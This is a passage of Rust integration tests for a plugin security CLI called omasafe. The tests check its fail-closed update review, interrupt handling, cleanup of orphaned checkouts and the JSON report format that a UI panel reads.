    // A refusal still refuses — but the operator first learns about the
    // interrupted attempt and how to recover it manually.
    fs::write(update.fixture.plugin.join("local.txt"), "dirty\n").unwrap();
    let (_stdout, stderr, _code) =
        update.review_update(&["--yes", "--expected-commit", &update.candidate]);
    let text = String::from_utf8_lossy(&stderr);
    assert!(text.contains("interrupted reviewed update"), "{text}");
    assert!(text.contains("manual checks"), "{text}");
    assert!(text.contains("omarchy plugin list --json"), "{text}");
}

#[test]
#[cfg(unix)]
fn review_update_resolves_candidate_from_registry_claim_for_preview() {
    let update = UpdateFixture::new();
    update.seed_trust();
    install_verified_catalog(&update.fixture, &update.candidate);

    // No --expected-commit and no terminal: the gate must refuse AFTER the
    // registry-resolved preview was produced (proves claim resolution works).
    let output = update
        .fixture
        .command()
        .env("OMASAFE_FAKE_STATE", &update.fake.state_path)
        .env("OMASAFE_FAKE_LOG", &update.fake.log_path)
        .env(
            "OMASAFE_FAKE_ORIGIN",
            update.origin.path().to_string_lossy().as_ref(),
        )
        .env(
            "OMASAFE_FAKE_RACE_ORIGIN",
            update.race_origin.path().to_string_lossy().as_ref(),
        )
        .env(
            "OMASAFE_FAKE_PLUGIN_DIR",
            update.fixture.plugin.to_string_lossy().as_ref(),
        )
        .args(["plugins", "review-update", "io.example.cli"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("registry claim from catalog commit"),
        "{stdout}"
    );
    assert!(stdout.contains(&update.candidate), "{stdout}");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("requires a terminal"), "{stderr}");
    assert!(!update.fake.log_contains("plugin update"));
}

/// Installs a verified cached snapshot whose single entry pins `candidate`
/// as the upstream observed commit for io.example.cli.
fn install_verified_catalog(fixture: &Fixture, candidate: &str) {
    use sha2::Digest as _;
    let source = TempDir::new().unwrap();
    let entry = serde_json::json!({
        "id": "io.example.cli",
        "sourceType": "community",
        "repo": "https://plugins.test/cli.git",
        "upstreamObservedCommit": candidate,
        "verificationStatus": "verified"
    });
    let catalog = format!("{}\n", serde_json::to_string(&[entry]).unwrap());
    fs::create_dir_all(source.path().join("site")).unwrap();
    fs::write(source.path().join("site/catalog.json"), &catalog).unwrap();
    init_repo(&source.path().join("site"), false);
    let revision = git_commit_all(&source.path().join("site"), "catalog fixture");

    let cache = fixture.cache.path().join("omasafe");
    fs::create_dir_all(&cache).unwrap();
    run_git(
        &cache,
        &[
            "clone",
            "--bare",
            "--quiet",
            source.path().join("site").to_string_lossy().as_ref(),
            "catalog.git",
        ],
    );
    fs::write(cache.join("catalog.json"), &catalog).unwrap();
    fs::write(
        cache.join("catalog.meta.json"),
        serde_json::json!({
            "repository_commit": revision,
            "repository_url": "https://github.com/HANCORE-linux/omarchy-plugin-marketplace",
            "retrieved_at": "2026-08-22T00:00:00Z",
            "file_digest": format!("{:x}", Sha256::digest(catalog.as_bytes()))
        })
        .to_string(),
    )
    .unwrap();
}

fn installed_head_of(update: &UpdateFixture) -> String {
    run_git(&update.fixture.plugin, &["rev-parse", "HEAD"])
}

#[test]
#[cfg(unix)]
fn review_update_sigint_during_native_update_fails_closed_with_exit_130() {
    let update = UpdateFixture::new();
    update.seed_trust();
    update.fake.set_mode("sleep");
    let started_marker = update.fixture.state.path().join("fake-update-started");

    // Raw std Command: this test needs a live child process with piped
    // streams to signal mid-flight; assert_cmd only offers blocking runs.
    // CARGO_BIN_EXE_ is exported for integration tests by cargo itself.
    let mut raw = std::process::Command::new(env!("CARGO_BIN_EXE_omasafe-cli"));
    let fixture = &update.fixture;
    raw.env("HOME", fixture._home.path())
        .env("XDG_CONFIG_HOME", fixture.config.path())
        .env("XDG_STATE_HOME", fixture.state.path())
        .env("XDG_CACHE_HOME", fixture.cache.path())
        .env("PATH", fixture.bin.path())
        .env("OMASAFE_FAKE_STATE", &update.fake.state_path)
        .env("OMASAFE_FAKE_LOG", &update.fake.log_path)
        .env("OMASAFE_FAKE_ORIGIN", update.origin.path())
        .env("OMASAFE_FAKE_RACE_ORIGIN", update.race_origin.path())
        .env("OMASAFE_FAKE_PLUGIN_DIR", &fixture.plugin)
        .env("OMASAFE_FAKE_STARTED", &started_marker)
        .args([
            "plugins",
            "review-update",
            "io.example.cli",
            "--yes",
            "--expected-commit",
            &update.candidate,
        ])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let mut child = raw.spawn().expect("review-update spawns");

    // Wait until the fake native updater is mid-flight, then SIGINT the CLI.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    while !started_marker.exists() {
        if std::time::Instant::now() >= deadline {
            let _ = child.kill();
            let dumped = child.wait_wait_with_output();
            panic!(
                "shim never started\nstdout:\n{}\nstderr:\n{}\nstate:{}\nlog:\n{}",
                String::from_utf8_lossy(&dumped.stdout),
                String::from_utf8_lossy(&dumped.stderr),
                fs::read_to_string(&update.fake.state_path).unwrap_or_default(),
                fs::read_to_string(&update.fake.log_path).unwrap_or_default()
            );
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    std::thread::sleep(std::time::Duration::from_millis(300));
    // The shim runs in its own process group (spawn_bounded), so signaling
    // only the CLI pid exercises exactly the cooperative-handler path: the
    // bounded poll loop must kill the sleeping child and unwind cleanly.
    let status = std::process::Command::new("/bin/sh")
        .args(["-c", &format!("kill -INT {}", child.id())])
        .output()
        .unwrap();
    assert!(status.status.success(), "kill failed");

    let output = child.wait_wait_with_output();
    assert_eq!(
        output.status.code(),
        Some(130),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("interrupted"), "{stderr}");
    assert!(stderr.contains("stays disabled"), "{stderr}");
    // Fail-closed: quiesce already disabled the plugin; no auto re-enable,
    // recovery record kept, live tree untouched.
    assert!(!update.fake.enabled());
    let record = flow_record(&update.fixture).expect("recovery record kept after interruption");
    assert_eq!(record["phase"], Value::String("failed".into()));
    assert_ne!(
        run_git(&update.fixture.plugin, &["rev-parse", "HEAD"]),
        update.candidate
    );
}

trait ChildExt {
    fn wait_wait_with_output(self) -> std::process::Output;
}

impl ChildExt for std::process::Child {
    /// Waits first and drains both pipes concurrently on threads so a chatty
    /// child can never deadlock us on one full pipe while the other stays
    /// open.
    fn wait_wait_with_output(mut self) -> std::process::Output {
        fn drain<R: std::io::Read>(pipe: Option<R>) -> Vec<u8> {
            let mut buffer = Vec::new();
            if let Some(mut pipe) = pipe {
                let _ = pipe.read_to_end(&mut buffer);
            }
            buffer
        }
        let stdout_handle = self
            .stdout
            .take()
            .map(|pipe| std::thread::spawn(move || drain(Some(pipe))));
        let stderr_handle = self
            .stderr
            .take()
            .map(|pipe| std::thread::spawn(move || drain(Some(pipe))));
        let status = self.wait().unwrap();
        let stdout = stdout_handle
            .map(|h| h.join().expect("stdout drain"))
            .unwrap_or_default();
        let stderr = stderr_handle
            .map(|h| h.join().expect("stderr drain"))
            .unwrap_or_default();
        std::process::Output {
            status,
            stdout,
            stderr,
        }
    }
}

#[test]
#[cfg(unix)]
fn panel_data_contract_pins_the_json_sections_the_ui_consumes() {
    // The omarchy panel consumes argv invocations and parses bounded JSON.
    // This pins the exact sections it may rely on so plugin-side changes
    // never silently break the UI contract.
    let fixture = Fixture::new();
    let plugin = fixture.plugin.clone();
    fs::write(
        plugin.join("manifest.json"),
        r#"{"schemaVersion":1,"id":"io.example.cli","name":"n","version":"1","kinds":["bar-widget"],"entryPoints":{"barWidget":"main.qml"}}"#,
    )
    .unwrap();
    fs::write(
        plugin.join("main.qml"),
        "import QtQuick\nItem {\n  property string u: \"https://example.test\"\n}\n",
    )
    .unwrap();

    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            plugin.to_string_lossy().as_ref(),
            "--format",
            "json",
        ])
        .output()
        .unwrap();
    assert!(output.status.success());
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let result = &report["result"];

    let analysis = &result["analysis"];
    assert_eq!(
        analysis["schema"],
        Value::String("omasafe.analysis.v1".into())
    );
    for section in [
        "findings",
        "capabilities",
        "invocation_edges",
        "coverage_limitations",
        "analysis_fingerprint",
        "policy_identity",
        "parser",
        "equivalence",
    ] {
        assert!(
            analysis.get(section).is_some(),
            "panel contract: missing analysis.{section}"
        );
    }
    // Findings carry review-facing fields with confidence, never a grade.
    if let Some(findings) = analysis["findings"].as_array() {
        for finding in findings {
            for field in [
                "rule_id",
                "severity",
                "confidence",
                "relative_path",
                "evidence",
            ] {
                assert!(
                    finding.get(field).is_some(),
                    "panel contract: finding missing {field}"
                );
            }
        }
    }
    // The parser block is present but may be explicitly null in
    // lexical-fallback builds — that null IS the visible degradation signal
    // the panel must render, so the key itself is contractual.
    assert!(
        analysis.get("parser").is_some(),
        "panel contract: parser key required (null allowed)"
    );
    if !analysis["parser"].is_null() {
        for field in [
            "grammar",
            "grammar_version",
            "tree_sitter_version",
            "language_abi_version",
        ] {
            assert!(
                analysis["parser"].get(field).is_some(),
                "panel contract: parser.{field} required when a parser participated"
            );
        }
    }

    let inventory = &result["payload_inventory"];
    for section in ["entries", "totals", "limitations", "coverage_states"] {
        assert!(
            inventory.get(section).is_some(),
            "panel contract: missing payload_inventory.{section}"
        );
    }
}

#[test]
#[cfg(unix)]
fn review_update_sweeps_orphaned_checkouts_from_dead_pids() {
    // Simulate a SIGKILLed earlier run by creating its temp checkout naming
    // pattern with a pid that cannot exist; the next run must remove it.
    let update = UpdateFixture::new();
    // Unique middle segment keeps concurrent test runs from colliding; the
    // parser only reads the pid after the last '-'.
    let dead_dir = std::env::temp_dir().join(format!(
        "omasafe-review-update-x{}-4000000",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .subsec_nanos()
    ));
    let _ = fs::remove_dir_all(&dead_dir);
    fs::create_dir_all(dead_dir.join("leftover")).unwrap();

    // Any invocation sweeps before its own outcome; this one still fails on
    // the missing trusted baseline afterwards.
    update.review_update(&[]);
    assert!(!dead_dir.exists(), "orphaned checkout was not swept");
}
